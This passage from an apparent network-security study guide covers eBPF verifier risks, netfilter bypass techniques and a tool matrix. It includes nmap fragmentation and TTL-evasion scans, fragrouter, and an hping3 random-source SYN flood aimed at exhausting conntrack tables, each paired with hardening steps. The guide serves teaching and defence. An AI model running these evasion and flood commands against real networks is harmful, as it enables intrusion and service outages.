#### eBPF/XDP

eBPF programs attached to XDP (eXpress Data Path) process packets at the NIC driver level before the kernel networking stack. Used for:
- **DDoS mitigation:** Drop attack packets at line rate (Cloudflare, Facebook)
- **Policy enforcement:** Cilium uses eBPF for Kubernetes network policies
- **Observability:** Packet tracing, flow telemetry without tcpdump overhead

**Security considerations:**
- eBPF programs are verified by the BPF verifier before loading — ensures no out-of-bounds access, no infinite loops, bounded execution.
- **Verifier bypasses** (historical CVEs: CVE-2021-3490, CVE-2021-31440, CVE-2021-34866) allowed privilege escalation from unprivileged eBPF to kernel code execution.
- **Mitigation:** Restrict `bpf()` syscall to `CAP_BPF` / `CAP_NET_ADMIN`. Set `kernel.unprivileged_bpf_disabled=1`.

```bash
# Restrict unprivileged BPF
sysctl -w kernel.unprivileged_bpf_disabled=1

# Verify loaded BPF programs
bpftool prog list
bpftool map list

# Monitor BPF verifier events
bpftool prog tracelog
```

---

### 5.7 Netfilter Bypass Techniques

#### Fragmented Packet Bypass

Some netfilter rules inspect only the first IP fragment (which contains the L4 header). Subsequent fragments pass without L4 inspection.

```bash
# nmap fragmented scan
nmap -f -sS 10.0.0.5
# -f fragments packets into 8-byte IP fragments

# Deeper fragmentation
nmap -f -f -sS 10.0.0.5
# Double -f = 16-byte fragments

# fragrouter — fragment traffic through attacker
fragrouter -B1
# -B1 = baseline normal IP forwarding
# Other modes: overlapping fragments, out-of-order, etc.
```

**Mitigation:**

```bash
# Load defragmentation modules (reassemble before filtering)
modprobe nf_defrag_ipv4
modprobe nf_defrag_ipv6

# nftables — implicit defragmentation in inet/ip tables
# iptables — enabled by loading the above modules
```

#### Conntrack Exhaustion

The connection tracking table (`nf_conntrack`) has a default size of 65536 entries. Each TCP/UDP connection consumes one entry. An attacker flooding with unique connections fills the table, causing `nf_conntrack: table full, dropping packet`.

```bash
# Check current conntrack usage
cat /proc/sys/net/netfilter/nf_conntrack_count
cat /proc/sys/net/netfilter/nf_conntrack_max

# Attack: flood with unique connections
hping3 --rand-source -p ++1 -S --flood target_ip

# Mitigation: increase table size
sysctl -w net.netfilter.nf_conntrack_max=524288

# Reduce timeouts for established connections
sysctl -w net.netfilter.nf_conntrack_tcp_timeout_established=3600
sysctl -w net.netfilter.nf_conntrack_udp_timeout=30
sysctl -w net.netfilter.nf_conntrack_udp_timeout_stream=120

# Bypass conntrack for specific traffic (raw table)
iptables -t raw -A PREROUTING -p udp --dport 53 -j NOTRACK
iptables -t raw -A OUTPUT -p udp --sport 53 -j NOTRACK

# nftables equivalent
nft add rule inet raw prerouting udp dport 53 notrack
```

#### TTL-Based Evasion

If an IDS/firewall is positioned at a different hop count than the target, the attacker can craft packets with TTL values that reach the IDS but expire before the target (or vice versa), causing the IDS to see different traffic than the target.

```bash
# nmap TTL evasion
nmap --ttl 64 -sS 10.0.0.5

# hping3 with specific TTL
hping3 -t 10 -S -p 80 10.0.0.5
```

**Mitigation:** IDS should normalize TTL values, or be positioned on the same network segment as the target.

---

## 6. Cross-References

**To Chapter 9A:** ARP spoofing (1.1) provides the Layer 2 MitM position enabling TCP hijacking and DNS poisoning in Chapter 9A. VLAN hopping and STP manipulation expand attacker reach across segments, making TCP/DNS/TLS attacks accessible from non-adjacent networks. MACsec (1.7) and 802.1X (1.8) are the Layer 2 analogues of TLS (Chapter 9A section 3) — authentication and encryption at different layers.

**To Domain 2:** eBPF/XDP networking (5.6) uses the same BPF infrastructure described in Domain 2 Chapter 2C section 4.3 (BPF cgroup controllers) and the same verifier (Domain 5, Chapter 5B section 4). Netfilter/nftables (5.7) is the same subsystem in Domain 5, Chapter 5B section 5.

**To Domain 5:** Kernel module loading for 8021q VLAN interfaces, eBPF verifier bypasses for privilege escalation, netfilter conntrack as kernel attack surface.

**To Domain 8:** Evil-twin WiFi attacks (2.4) serve as the network-level delivery mechanism for web attacks (MitM to inject JavaScript, steal session cookies, modify DNS responses for phishing). DNS rebinding (Chapter 9A section 2.2) chains with browser SOP (Chapter 8A section 1) to access internal services.

**To Domain 6:** SDN controller compromise (5.2) chains with container escape if the controller runs in a containerized environment (OpenDaylight in Docker). Cilium eBPF policies (5.4) are the primary east-west security mechanism in Kubernetes clusters discussed in Domain 6.

---

## 7. Quick-Reference Tool Matrix

| Domain | Tool | Purpose |
|--------|------|---------|
| ARP | arpspoof, ettercap, Bettercap | ARP cache poisoning |
| ARP | arpwatch | ARP change detection |
| MAC | macof, yersinia | CAM table flooding |
| VLAN | yersinia, Frogger | DTP negotiation, VLAN hopping |
| STP | yersinia, Scapy | BPDU injection, root bridge hijack |
| DHCP | DHCPig, yersinia, dnsmasq | DHCP starvation, rogue DHCP |
| CDP | cdpsnarf, yersinia | CDP reconnaissance, flooding |
| WiFi recon | airodump-ng, Kismet, WiFi Pineapple | AP/client discovery |
| WiFi attack | aireplay-ng, mdk4 | Deauthentication |
| WPA2 | aircrack-ng, hashcat, hcxdumptool | Handshake/PMKID cracking |
| WPA2-Ent | hostapd-mana, freeradius-wpe, asleap | EAP credential capture |
| WPS | reaver, bully | WPS PIN brute force |
| Evil twin | hostapd-mana, Bettercap | Rogue AP, KARMA |
| RFID/NFC | Proxmark3, mfoc, mfcuk | Card cloning, key recovery |
| SS7 | SigPloit, SS7MAPer, SCTPscan | SS7 attack/audit |
| IMSI | SnoopSnitch, AIMSICD, Crocodile Hunter | IMSI catcher detection |
| SDN | ovs-ofctl, ovs-dpctl, bpftool | OVS management, BPF inspection |
| Netfilter | nmap (-f), hping3, fragrouter | Firewall evasion |
| WIDS | Kismet, OpenWIPS-ng | Wireless intrusion detection |
